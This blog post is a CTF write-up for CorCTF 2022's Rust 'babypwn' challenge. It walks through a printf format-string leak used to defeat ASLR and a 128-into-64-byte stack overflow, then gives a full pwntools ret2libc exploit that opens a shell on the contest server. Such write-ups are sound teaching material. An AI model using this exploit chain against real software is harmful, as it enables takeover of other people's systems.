---
title: "2022 Corctf Pwn Babypwn"
date: 2022-08-14T10:10:04-04:00
tags: ["ctf", "pwn", "rop", "corctf"]
draft: true
---

# The Challenge

Solves: 114

> Just another one of those typical intro babypwn challs... wait, why is this in Rust?  

Flag: `corctf{why_w4s_th4t_1n_rust???}`

## Overview

This challenge is the first in a series of many binary exploitation challenges for the 2022 CorCTF. Unfortunately this was the only pwn challenge that I had the time to solve during the length of the CTF. 

This challenge consists of the classic memory address leak allowing us to execute a _Ret2Libc_ attack. However, this challenge has been written in Rust which provides memory safe code through compile time checks. Luckily for us, som of these checks have been disabled by the use of `unsafe{}` which conveniently wraps all the challenge code.


## Getting started

The first thing I always do for a pwn challenge is check the security of the challenge binary. This way I know if a memory leak will be needed and to be on the lookout for one if so. We can do this by using the `checksec` command that is part of [pwntools](https://github.com/Gallopsled/pwntools). 

`$ checksec ./babypwn`

![](/images/Pasted%20image%2020220814113356.png)
_Fig. 1 - Security of challenge binary_

Now we can see that we are dealing with a 64-bit binary that has all protections enabled except for _canaries_. Before we continue with attacking the binary, we must take note that _DEP_ (_Data Execution Prevention_ or _No eXecute_) is enabled. This means that we will not be able to execute shell code from any buffers that we can control. Instead, we will rely on _Return Orientated Programming_ or _ROP_. This technique is not the focus of this blog post but you can find more about it [here](https://ropemporium.com/). One last thing to note is that _PIE_ (_Position Independent Code_) is also enabled. This protection mechanism randomizes the base address of the binary when it is executed. Without _PIE_ we would be able to hardcode the address of functions and ROP gadgets that are within the challenge binary. Sadly _PIE_ is enabled so we cannot do this.

Now that we know what protections we have to deal with, let's look at the challenge source code:

Challenge source:

```rust
use libc;
use libc_stdhandle;

fn main() {
    unsafe {
        libc::setvbuf(libc_stdhandle::stdout(), &mut 0, libc::_IONBF, 0);

        libc::printf("Hello, world!\n\0".as_ptr() as *const libc::c_char);
        libc::printf("What is your name?\n\0".as_ptr() as *const libc::c_char);

        let text = [0 as libc::c_char; 64].as_mut_ptr();
        libc::fgets(text, 64, libc_stdhandle::stdin());
        libc::printf("Hi, \0".as_ptr() as *const libc::c_char);
        libc::printf(text);

        libc::printf("What's your favorite :msfrog: emote?\n\0".as_ptr() as *const libc::c_char);
        libc::fgets(text, 128, libc_stdhandle::stdin());
        
        libc::printf(format!("{}\n\0", r#"
          .......           ...----.
        .-+++++++&&&+++--.--++++&&&&&&++.
       +++++++++++++&&&&&&&&&&&&&&++-+++&+
      +---+&&&&&&&@&+&&&&&&&&&&&++-+&&&+&+-
     -+-+&&+-..--.-&++&&&&&&&&&++-+&&-. ....
    -+--+&+       .&&+&&&&&&&&&+--+&+... ..
   -++-.+&&&+----+&&-+&&&&&&&&&+--+&&&&&&+.
 .+++++---+&&&&&&&+-+&&&&&&&&&&&+---++++--
.++++++++---------+&&&&&&&&&&&&@&&++--+++&+
-+++&&&&&&&++++&&&&&&&&+++&&&+-+&&&&&&&&&&+-
.++&&++&&&&&&&&&&&&&&&&&++&&&&++&&&&&&&&+++-
 -++&+&+++++&&&&&&&&&&&&&&&&&&&&&&&&+++++&&
  -+&&&@&&&++++++++++&&&&&&&&&&&++++++&@@&
   -+&&&@@@@@&&&+++++++++++++++++&&&@@@@+
    .+&&&@@@@@@@@@@@&&&&&&&@@@@@@@@@@@&-
      .+&&@@@@@@@@@@@@@@@@@@@@@@@@@@@+
        .+&&&@@@@@@@@@@@@@@@@@@@@@&+.
          .-&&&&@@@@@@@@@@@@@@@&&-
             .-+&&&&&&&&&&&&&+-.
                 ..--++++--."#).as_ptr() as *const libc::c_char);
    }
}
```

At first I was worried about this challenge due to it being written in Rust but as soon as I saw the `unsafe{}` keyword wrapping the entire program I relaxed. As mentioned previously, Rust provides memory safety through its type system and compile time checks. However, a developer can use the [`unsafe`](https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html) keyword to tell the compiler to skip some of these checks for a chunk of code. I do not know much about Rust other than the bits and pieces of I have read so all that you really need to understand for this challenge is that `unsafe{}` block allows the challenge author to call the _foreign_ Libc functions that we all know and love. Because these Libc functions are the usual culprits for memory corruption vulnerabilities we can look for them the same way we normally would. 

Reading through the source code, we see some information being printed to prompt the user for a name, greeting us with our name, prompting us for our favorite 🐸 emote, reading out answer, then printing some wonderful ASCII art. 

Example program run:

![](/images/Pasted%20image%2020220814121811.png)
_Fig. 2 - Example program execution_

Recall that _DEP_ and _PIE_ are enabled which means we need a way to leak a memory address to defeat _ASLR_ (_Address Space Layout Randomization_) and perform our _Ret2Libc_ exploit. 

Lucky for us there is an improper usage of the `printf()` function that will allow us to leak address from the stack:

```rust
// ...
let text = [0 as libc::c_char; 64].as_mut_ptr();
libc::fgets(text, 64, libc_stdhandle::stdin());
libc::printf("Hi, \0".as_ptr() as *const libc::c_char);
libc::printf(text); // <-- Improper usage of 'printf()'
// ...
```

Exactly why this usage is exploitable is beyond the scope of this writeup but if you would like to read more about you can check this blog for a writeup on format string vulnerabilities or visit [here](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/#:~:text=A%20format%20string%20vulnerability%20is,the%20format%20argument%20to%20printf%20.) for a quick explanation and example. 

We can test this vulnerability by giving format specifiers instead of our name for the first input to the program:

![](/images/Pasted%20image%2020220814121936.png)
_Fig. 3 - Leaking addresses_

Excellent! Now that we have a way to leak memory addresses from the stack we should take a look at what these addresses are for. 

Using _GDB_ along with the extension [gef](https://github.com/hugsy/gef), we can attach to the running binary and see where the leaked addresses fall within the process' memory. The easiest way to do this is to use two terminals or a multiplexer like [tmux](https://github.com/tmux/tmux/wiki). 

1. Execute the challenge binary in the first terminal: `$ ./babypwn`
2. Enter your format string: `%p %p %p %p` (_make sure to hit enter and see the leaked addresses_)
4. Attach to the challenge binary in the second terminal: `$ sudo gdb -q -p $(pidof babypwn)`

Following the above steps should yield two terminals that look similar to the following:

![](/images/Pasted%20image%2020220814123701.png)
_Fig. 4 - Attaching to challenge binary_

Looks good! In order to determine where these leaked addresses live we can use the `vmmap` command (_or `info proc mappings`_). These commands will show us where everything for the process is mapped in memory. 

Looking closely we see that the first _non-zero_ address that we leaked (`0x7f4abd693bc0`) lives in the section just before the base of Libc:

```
[...]
0x0055b443fa0000 0x0055b443fa1000 0x00000000368000 rw- /home/onenutw0nder/dev/ctf/cor_2022/babypwn_pwn/babypwn
0x0055b4442a8000 0x0055b4442c9000 0x00000000000000 rw- [heap]
0x007f4abd693000 0x007f4abd695000 0x00000000000000 rw-                                                             <<------- LEAKED ADDRESS LIVES HERE!
0x007f4abd695000 0x007f4abd6b7000 0x00000000000000 r-- /home/onenutw0nder/dev/ctf/cor_2022/babypwn_pwn/libc.so.6   <<------- LIBC BASE ADDRESS!
0x007f4abd6b7000 0x007f4abd82f000 0x00000000022000 r-x /home/onenutw0nder/dev/ctf/cor_2022/babypwn_pwn/libc.so.6
0x007f4abd82f000 0x007f4abd87d000 0x0000000019a000 r-- /home/onenutw0nder/dev/ctf/cor_2022/babypwn_pwn/libc.so.6
0x007f4abd87d000 0x007f4abd881000 0x000000001e7000 r-- /home/onenutw0nder/dev/ctf/cor_2022/babypwn_pwn/libc.so.6
0x007f4abd881000 0x007f4abd883000 0x000000001eb000 rw- /home/onenutw0nder/dev/ctf/cor_2022/babypwn_pwn/libc.so.6
0x007f4abd883000 0x007f4abd887000 0x00000000000000 rw- 
[...]
```

Knowing this information allows us to calculate the offset of the address that we leaked to the base of Libc. We can do this by performing the following math:

```
libcBase - leakedAddress = offset
0x007f4abd695000 - 0x7f4abd693bc0 = offset
offset = 0x1440
```

It is important to realize that this offset is a constant value. Each time we execute the binary the first _non-zero_ address that we leak will be different due to _ASLR_ along with the base address of Libc, however, the leaked address will always be `0x1440` bytes away from the base of Libc.

Congratulations! You have successfully bypassed _ASLR_ and because we know where Libc is located in memory we have a way to defeat _DEP_ as well! _Note that we can defeat PIE by finding the offset to the base address of the binary if we wanted to._

Now we need to find a way to use our newfound information to get our flag! Thankfully the developer of this application introduced another vulnerability in the form of a _stack buffer overflow_. Take a look at the following code:

```rust
// ...
let text = [0 as libc::c_char; 64].as_mut_ptr(); // <-- 'text' is 64 bytes long
// ... asks and gets our name
libc::printf("What's your favorite :msfrog: emote?\n\0".as_ptr() as *const libc::c_char);
libc::fgets(text, 128, libc_stdhandle::stdin());
// ... prints frog art

```

With only the important lines showing it should become clear very quickly that the program is going to read 128 bytes from the user and place them into the `text` buffer that is only 64 bytes long. This is a very straightforward _stack buffer overflow_ that we can exploit to get a shell then the flag!

First, we need to figure out how many bytes we need to corrupt the saved return pointer. Thankfully, `gef` makes this very easy by using the `pattern` command:

1. Load the program into _GDB_: `$ gdb babypwn`
2. Create a pattern that is 128 bytes long: `gef> pattern create 128`
3. Execute the program and use your generated pattern as your second input: `gef> run`

Following the above instructions should have yielded a state similar to the one shown below:

![](/images/Pasted%20image%2020220814131314.png)
_Fig. 5 - Segfault after pattern input_

The program should have crashed due to our large input that corrupted all the important stack information. The cool thing we can do now is use the command `pattern search` to calculate where in our string a specified pattern shows up. This is because the `pattern create` command makes a string of characters that is _cyclic_ in nature. This allows us to give `pattern seach` a substring to search for within the original pattern and it will be able to tell us how far into the string that substring occurs. In our case, we want to figure out how many bytes it takes to reach the _saved RIP_:

1. Find the value of the _saved RIP_: `gef> info frame` 
2. Copy the value of the _saved RIP_ and run: `gef> pattern search <SAVED_RIP>`

Following the steps above should yield something similar:

![](/images/Pasted%20image%2020220814132330.png)
_Fig. 6 - Offset to saved RIP_

Wonderful! We can now corrupt the saved return address correctly now that the offset from our input is known. 

With this final piece of information we can craft our final exploit!

## Creating the Exploit

I highly recommend using [pwntools](https://github.com/Gallopsled/pwntools) to create your exploits in Python. This library provides so many functions that make our lives much easier.

In general, our exploit needs to accomplish the following:

- Leak an address via the format string vulnerability we found earlier
- Calculate the base address of Libc using the offset of `0x1440` that we calculated earlier
- Create a _ROP chain_ that performs a _Ret2Libc_ attack

I am not going to spend a lot of time describing how to write the exploit in this post. Eventually I will put together a tutorial on how to use `pwntools` as it can be quite confusing and annoying if you are just starting out. Regardless, the exploit code should be pretty straightforward and it follows the same steps that we have covered up to this point.

The exploit code is as follows:

```python
from pwn import *

# Distance to return address
BUF_SIZE = 96

# 'OFFSET' is the distance from the leaked address we are using to the base of libc
# obtained via GDB
OFFSET = 0x1440

# Load binaries
libc = ELF("./libc.so.6")
bin = ELF("./babypwn")
rop = ROP(libc)

def start():
    if args.LOCAL:
        return process("./babypwn")
    if args.GDB:
        return gdb.debug("./babypwn")
    if args.REMOTE:
        return remote("be.ax", 31801)

def main():
    io = start()

    # Leak libc addr from stack
    fmt_payload = b"%p " * 5
    io.recvuntil(b"name?\n")
    io.sendline(fmt_payload)

    # Calculate Libc values
    libc_addr = (io.recvline().decode().split()[2])
    libc_base = int(libc_addr, 16) + OFFSET
    libc_binsh = next(libc.search(b"/bin/sh")) + libc_base
    libc_system = libc.symbols["system"] + libc_base

    # Pretty logging
    log.info(f"Leaked libc address --> {libc_addr}")
    log.info(f"Base address of Libc --> {hex(libc_base)}")
    log.info(f"Libc '/bin/sh' --> {hex(libc_binsh)}")
    log.info(f"Libc 'system()' --> {hex(libc_system)}")

    # Find ROP gadgets
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0] + libc_base
    ret = rop.find_gadget(["ret"])[0] + libc_base

    # Build final chain
    payload = b"A" * BUF_SIZE
    payload += p64(pop_rdi)
    payload += p64(libc_binsh)
    payload += p64(ret) # Needed for stack alignment shenanigans
    payload += p64(libc_system)

    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
```

The one important thing to note is the extra `ret` gadget in the payload. This is needed in order to fix a [stack alignment issue](https://ropemporium.com/guide.html#common-pitfalls) that can happen and will cause a _segmentation fault_ on a `MOVAPS` instruction. 

Enjoy your shell and flag!

`$ python3 exploit.py REMOTE`

![](/images/Pasted%20image%2020220814143033.png)
_Fig. 7 - Running the exploit_

## Conclusion

This challenge was nothing new in terms of the exploitation methods used but it was unique in that the challenge was written in Rust (_in an unsafe way of course_). It was very refreshing to explore a familiar exploit in a different environment than your typical _C_ program. This type of challenge is an excellent way to show how developers can still introduce vulnerabilities into a program even though the language is designed to prevent memory corruption. Just remember to really understand what you are doing anytime you are required to use a keyword that is `unsafe`.